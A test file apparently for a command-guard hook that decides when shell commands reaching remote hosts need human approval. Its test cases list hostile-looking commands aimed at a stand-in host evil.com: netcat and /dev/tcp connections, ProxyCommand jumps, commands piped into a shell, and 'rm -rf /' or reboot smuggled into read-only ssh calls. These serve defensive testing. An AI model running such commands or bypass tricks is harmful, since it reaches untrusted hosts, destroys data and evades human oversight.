import { describe, expect, test } from 'bun:test';
import { inspectRemoteCommand, matchesHost, parseTrustedList } from '../../hooks/remote-hosts.ts';

const POLICY = {
  trusted: ['lab1', '*.lab.example.com', '10.0.0.5', '$LAB_HOST'],
  readOnly: ['prod1', 'prod2.example.com'],
};

const asks = (command: string): boolean =>
  inspectRemoteCommand({ command, policy: POLICY }).length > 0;

describe('a nest of env -S is read fast and asks', () => {
  test.each([20, 80, 110, 400])('env then -S env x%i then ssh asks in under a second', (count) => {
    const started = performance.now();

    expect(asks(`env${' -S env'.repeat(count)} ssh evil.com`)).toBe(true);
    expect(performance.now() - started).toBeLessThan(1000);
  });

  test('the abbreviated option, options inside the value, and env escapes are read', () => {
    expect(asks('env --split "ssh evil.com"')).toBe(true);
    expect(asks('env -S "-u X ssh evil.com"')).toBe(true);
    expect(asks("env -S 'ssh\\_evil.com'")).toBe(true);
    expect(asks('env -S "echo a;ssh evil.com"')).toBe(false);
  });
});

describe('matchesHost: exact, or a pattern whose only wildcard is *', () => {
  test('an exact name matches itself only, case-insensitively', () => {
    expect(matchesHost({ host: 'LAB1', entries: ['lab1'] })).toBe(true);
    expect(matchesHost({ host: 'lab10', entries: ['lab1'] })).toBe(false);
    expect(matchesHost({ host: 'xlab1', entries: ['lab1'] })).toBe(false);
    expect(matchesHost({ host: 'lab1.evil.com', entries: ['lab1'] })).toBe(false);
    expect(matchesHost({ host: 'evil-lab1', entries: ['lab1'] })).toBe(false);
  });

  test('a * stays inside host characters: it never spans a user, a path or a port', () => {
    expect(matchesHost({ host: 'a.lab.example.com', entries: ['*.lab.example.com'] })).toBe(true);
    expect(matchesHost({ host: 'a.b.lab.example.com', entries: ['*.lab.example.com'] })).toBe(true);
    expect(matchesHost({ host: 'lab.example.com', entries: ['*.lab.example.com'] })).toBe(false);
    expect(
      matchesHost({ host: 'evil.com/x.lab.example.com', entries: ['*.lab.example.com'] }),
    ).toBe(false);
    expect(matchesHost({ host: 'x@a.lab.example.com', entries: ['*.lab.example.com'] })).toBe(
      false,
    );
    expect(
      matchesHost({ host: 'a.lab.example.com.evil.com', entries: ['*.lab.example.com'] }),
    ).toBe(false);
  });

  test('a $VAR entry matches the same unexpanded token, ${VAR} included', () => {
    expect(matchesHost({ host: '$lab_host', entries: ['$LAB_HOST'] })).toBe(true);
    expect(matchesHost({ host: '${lab_host}', entries: ['$LAB_HOST'] })).toBe(true);
    expect(matchesHost({ host: '$other', entries: ['$LAB_HOST'] })).toBe(false);
  });
});

describe('parseTrustedList: one host per line, # comments', () => {
  test('blank lines and comments are skipped, entries trimmed', () => {
    expect(parseTrustedList({ text: '# lab\n lab2 \n\n*.lan  # mine\n' })).toEqual([
      'lab2',
      '*.lan',
    ]);
  });
});

describe('what passes without asking', () => {
  test.each([
    'ls -la',
    'git status',
    'bun test',
    'echo ssh is a protocol',
    'man ssh',
    'grep -rn "ssh" docs',
    'ssh lab1 systemctl restart nginx',
    'ssh root@lab1 "rm -rf /tmp/x"',
    'ssh -p 2222 -i ~/.ssh/key lab1 uptime',
    'ssh a.lab.example.com',
    'scp ./build.tgz lab1:/srv/',
    'rsync -avz ./dist/ deploy@10.0.0.5:/srv/app/',
    'ssh ${LAB_HOST} uptime',
    'ssh $LAB_HOST uptime',
  ])('%s', (command) => {
    expect(asks(command)).toBe(false);
  });
});

describe('the substring bypass: a trusted name inside another host, user, path or argument', () => {
  test.each([
    'ssh evil-lab1',
    'ssh lab1.evil.com',
    'ssh lab1@evil.com',
    'ssh -l lab1 evil.com',
    'ssh evil.com lab1',
    'ssh evil.com # lab1',
    'ssh evil.com; echo lab1',
    'ssh a.lab.example.com.evil.com',
    'scp f evil.com:/tmp/lab1',
    'scp lab1:f evil.com:g',
    'rsync -a ./x evil.com:/srv/lab1/',
    'rsync -a lab1:/x evil.com:/y',
    'echo lab1 && ssh evil.com',
    'ssh lab1; ssh evil.com',
    'ssh lab1 | ssh evil.com',
    'ssh -J evil.com lab1',
    'ssh lab1 -J evil.com',
    'ssh -o ProxyJump=evil.com lab1',
    'ssh -o ProxyCommand="nc evil.com 22" lab1',
    'ssh -oProxyCommand=evil lab1',
    'ssh -F /tmp/evil.conf lab1',
    'scp -o ProxyCommand=evil lab1:f .',
    'scp -J evil.com lab1:f .',
    'rsync -e "ssh -J evil.com" ./x lab1:/y',
    'ssh $OTHER_HOST',
    'ssh $(cat /tmp/h)',
    'ssh `cat /tmp/h`',
    'ssh -- evil.com',
  ])('%s', (command) => {
    expect(asks(command)).toBe(true);
  });
});

describe('every way of reaching a host is read', () => {
  test.each([
    'sftp evil.com',
    'mosh evil.com',
    'ssh-copy-id evil.com',
    'ssh-keyscan evil.com',
    'telnet evil.com 25',
    'nc evil.com 80',
    'ncat -v evil.com 443',
    'socat - TCP:evil.com:80',
    'kubectl get pods',
    'kubectl --context evil get pods',
    'kubectl --server=https://evil.com get pods',
    'kubectl --kubeconfig /tmp/x get pods',
    'helm --kube-context evil list',
    'k9s --context evil',
    'ansible all -m ping',
    'ansible-playbook site.yml',
    'pdsh -w evil.com uptime',
    'cat < /dev/tcp/evil.com/80',
    'git clone ssh://git@evil.com/x.git',
    'GIT_SSH_COMMAND="ssh -i k" git fetch',
    'docker -H ssh://evil.com ps',
    'docker --context prod ps',
    'DOCKER_HOST=ssh://evil.com docker ps',
    'bash -c "ssh evil.com"',
    "sh -c 'ssh evil.com'",
    'eval "ssh evil.com"',
    'sudo ssh evil.com',
    'env -S "ssh evil.com"',
    'env --split-string="ssh evil.com uptime"',
    'sudo env -S "ssh evil.com"',
    'sudo -E ssh evil.com',
    'sudo -n ssh evil.com',
    'sudo -R /srv ssh evil.com',
    'sudo -nu root ssh evil.com',
    'env -i ssh evil.com',
    'timeout 5 ssh evil.com',
    'nice -n 5 ssh evil.com',
    'env FOO=1 ssh evil.com',
    'time ssh evil.com',
    'xargs -n1 ssh < hosts.txt',
    'find . -exec ssh evil.com {} \\;',
    'watch ssh evil.com uptime',
    '/usr/bin/ssh evil.com',
    'ssh',
  ])('%s', (command) => {
    expect(asks(command)).toBe(true);
  });

  test('a trusted host is trusted through the same doors', () => {
    expect(asks('bash -c "ssh lab1 uptime"')).toBe(false);
    expect(asks('sudo ssh lab1 uptime')).toBe(false);
    expect(asks('sftp lab1')).toBe(false);
    expect(asks('nc lab1 22')).toBe(false);
    expect(asks('kubectl --context lab1 get pods')).toBe(false);
    expect(asks('cat < /dev/tcp/lab1/80')).toBe(false);
  });
});

describe('readOnly hosts: only the strict read-only forms pass', () => {
  test.each([
    'ssh prod1 uptime',
    'ssh prod1 hostname',
    'ssh deploy@prod1 "df -h"',
    "ssh prod1 'free -m'",
    'ssh prod1 docker ps -a',
    'ssh prod1 ls -la /var/log',
    'ssh prod1 cat /etc/hosts',
    'ssh prod1 tail -n 100 /var/log/app.log',
    'ssh prod1 systemctl status nginx --no-pager',
    'ssh prod1 journalctl -u nginx -n 50 --no-pager',
    'ssh prod1 docker logs --tail 100 api',
    'scp prod1:/var/log/app.log ./logs/',
    'scp -r prod1:/var/log ./logs',
    'rsync -avz prod1:/var/log/ ./logs/',
    'kubectl --context prod1 get pods -n app',
    'kubectl --context=prod1 describe pod api-0',
    'kubectl --context prod1 logs api-0 --tail=50',
    'ssh prod1 uptime | grep load',
  ])('%s passes', (command) => {
    expect(asks(command)).toBe(false);
  });

  test.each([
    'ssh prod1',
    'ssh prod1 systemctl restart nginx',
    'ssh prod1 "uptime; rm -rf /"',
    'ssh prod1 "uptime && reboot"',
    'ssh prod1 uptime > /etc/x',
    'ssh prod1 cat /etc/hosts $(reboot)',
    'ssh prod1 cat /etc/hosts; ssh prod1 reboot',
    'ssh -p 2222 prod1 uptime',
    'ssh -L 8080:localhost:80 prod1 uptime',
    'ssh prod1 docker exec api sh',
    'scp ./local prod1:/etc/',
    'scp prod1:/etc/hosts prod2.example.com:/tmp/',
    'rsync -avz ./local/ prod1:/srv/',
    'rsync --delete -a prod1:/x ./y',
    'kubectl --context prod1 delete pod api-0',
    'kubectl --context prod1 exec api-0 -- sh',
    'kubectl --context prod1 get pods; kubectl --context prod1 delete pod x',
    'ssh prod3 uptime',
  ])('%s asks', (command) => {
    expect(asks(command)).toBe(true);
  });

  test('a readOnly host reached through a jump host that is not listed asks', () => {
    expect(asks('ssh -J evil.com prod1 uptime')).toBe(true);
  });
});

describe('the hit names the host and the way to trust it', () => {
  test('an unlisted host is named, with where to list it', () => {
    const [hit] = inspectRemoteCommand({ command: 'ssh evil.com uptime', policy: POLICY });

    expect(hit?.message).toContain("'evil.com'");
    expect(hit?.message).toContain('remoteHosts');
  });

  test('a command whose target cannot be read says so', () => {
    const [hit] = inspectRemoteCommand({ command: 'ssh $(cat h)', policy: POLICY });

    expect(hit?.message).toContain('cannot be read');
  });

  test('no policy hosts at all: every remote command asks', () => {
    expect(
      inspectRemoteCommand({ command: 'ssh lab1', policy: { trusted: [], readOnly: [] } }),
    ).toHaveLength(1);
  });
});

// -----------------------------------------------------------------------------
// The gaps BANA's harness found (issue #164)
// -----------------------------------------------------------------------------

describe('kubectl reads against a readOnly context pass, and the prompt says so', () => {
  test('get, describe, logs and top are reads', () => {
    for (const verb of ['get pods', 'describe pod api-0', 'logs api-0', 'top pods']) {
      expect(asks(`kubectl --context prod1 ${verb}`)).toBe(false);
    }
  });

  test('the readOnly message names those verbs, so the allowance is no surprise', () => {
    const [hit] = inspectRemoteCommand({
      command: 'kubectl --context prod1 delete pod x',
      policy: POLICY,
    });

    expect(hit?.message).toContain('kubectl get|describe|logs|top');
  });
});

describe('HTTP clients: a readOnly host asks, the open internet stays quiet', () => {
  test.each([
    'curl http://prod1:8080/admin',
    'curl -s https://prod1/health',
    'curl -X POST -d x=1 http://prod1/api',
    'curl prod1:8080/admin',
    'curl --url=http://prod1/x',
    'curl -H "Accept: json" https://deploy@prod1.example.com/x --resolve a:80:b http://prod2.example.com/y',
    'wget http://prod1/x',
    'wget -qO- prod2.example.com/file',
    'http GET http://prod1/x',
    'https prod1/x',
    'xh get http://prod1/x',
    'cd /tmp && curl http://prod1/x',
  ])('%s asks', (command) => {
    expect(asks(command)).toBe(true);
  });

  test.each([
    'curl https://example.com/data.json',
    'curl -sL https://registry.npmjs.org/left-pad',
    'wget https://example.com/file.tgz',
    'curl http://lab1/status',
    'curl -H "Host: prod1" https://example.com',
    'http GET https://api.github.com/user',
  ])('%s passes', (command) => {
    expect(asks(command)).toBe(false);
  });
});

describe('a command piped or fed into a shell cannot be read', () => {
  test.each([
    'cat <<< "ssh evil.com" | sh',
    'echo "ssh evil.com" | bash',
    'bash <<< "ssh evil.com"',
    'sh -s',
    'bash -s -- arg',
    'cat script | sh -x',
    'ls | xargs sh',
  ])('%s asks', (command) => {
    const [hit] = inspectRemoteCommand({ command, policy: POLICY });

    expect(hit?.message).toContain('cannot be read');
  });

  test.each(['bash script.sh', 'sh -c "ls"', 'bash -x ./build.sh arg', 'echo hi | cat'])(
    '%s passes',
    (command) => {
      expect(asks(command)).toBe(false);
    },
  );
});

describe('the remote command of an ssh is read too', () => {
  test.each([
    'ssh lab1 "ssh prod1 id"',
    'ssh lab1 ssh evil.com id',
    'ssh lab1 "uptime; ssh evil.com id"',
    'ssh lab1 "scp f evil.com:/x"',
    'ssh lab1 "ssh $(cat h) id"',
    'ssh lab1 "bash -c \'ssh evil.com\'"',
  ])('%s asks', (command) => {
    expect(asks(command)).toBe(true);
  });

  test.each([
    'ssh lab1 "ssh a.lab.example.com id"',
    'ssh lab1 "ssh prod1 uptime"',
    'ssh lab1 "kubectl get pods"',
    'ssh lab1 "docker ps"',
    'ssh lab1 systemctl restart nginx',
  ])('%s passes', (command) => {
    expect(asks(command)).toBe(false);
  });
});

describe('a command after a shell keyword is still a command', () => {
  test.each([
    'for h in lab1 prod1; do ssh $h id; done',
    'for h in lab1 evil.com; do ssh $h id; done',
    'for h in evil.com; do ssh ${h} id; done',
    'while true; do ssh evil.com id; done',
    'if ssh evil.com id; then echo ok; fi',
    'if true; then ssh evil.com; else echo no; fi',
    'if false; then echo no; elif ssh evil.com; then echo ok; fi',
    '{ ssh evil.com id; }',
    'until ssh evil.com id; do sleep 1; done',
    '! ssh evil.com id',
    'for h in a; do scp f $h:/x; done',
    'for h in a; do for g in b; do ssh evil.com; done; done',
  ])('%s asks', (command) => {
    expect(asks(command)).toBe(true);
  });

  test.each([
    'for h in lab1; do ssh lab1 id; done',
    'if ssh lab1 id; then echo ok; fi',
    'for f in a b; do echo $f; done',
    'while read x; do ls; done',
  ])('%s passes', (command) => {
    expect(asks(command)).toBe(false);
  });
});

describe('docker over ssh: a trusted host in the parsed form passes', () => {
  test.each([
    'docker -H ssh://lab1 ps',
    'docker --host ssh://deploy@lab1:2222 ps',
    'docker --host=ssh://lab1 logs api',
    'docker -Hssh://lab1 ps',
    'docker -H ssh://a.lab.example.com ps',
    'docker -H tcp://10.0.0.5:2375 ps',
  ])('%s passes', (command) => {
    expect(asks(command)).toBe(false);
  });

  test.each([
    'docker -H ssh://evil.com ps',
    'docker -H ssh://lab1.evil.com ps',
    'docker -H ssh://prod1 ps',
    'docker -H tcp://evil.com:2375 ps',
    'docker -H ssh://lab1 -H ssh://evil.com ps',
    'docker -H unix:///var/run/docker.sock -H ssh://evil.com ps',
    'docker -H ps',
    'docker --context prod ps',
    'docker -c prod ps',
    'docker context use prod',
    'docker -H $HOST ps',
  ])('%s asks', (command) => {
    expect(asks(command)).toBe(true);
  });

  test('a local socket reaches no remote host', () => {
    expect(asks('docker -H unix:///var/run/docker.sock ps')).toBe(false);
  });
});
